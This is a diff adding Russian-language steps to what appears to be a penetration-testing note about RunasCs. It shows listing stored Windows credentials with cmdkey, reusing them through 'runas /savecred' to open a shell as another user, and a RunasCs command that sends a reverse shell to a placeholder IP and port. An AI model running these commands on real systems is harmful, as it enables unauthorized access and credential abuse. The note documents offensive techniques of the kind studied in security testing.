@@ -29,6 +29,23 @@
 
 ## Использование
 
+Смотрим cmdkey 
+```
+cmdkey /list
+```
+
+Если у нас есть что-то типо этого  
+```
+Target: Domain:interactive=SRV01\mcharles
+```
+Это означает, что учетные данные используются для интерактивных сеансов входа в систему
+
+```powershell
+runas /savecred /user:SRV01\mcharles cmd
+```
+
+
+
 ```powershell
 ./RunasCs.exe <domain>\<user> pass cmd.exe -r <ip>:<port>
 ```
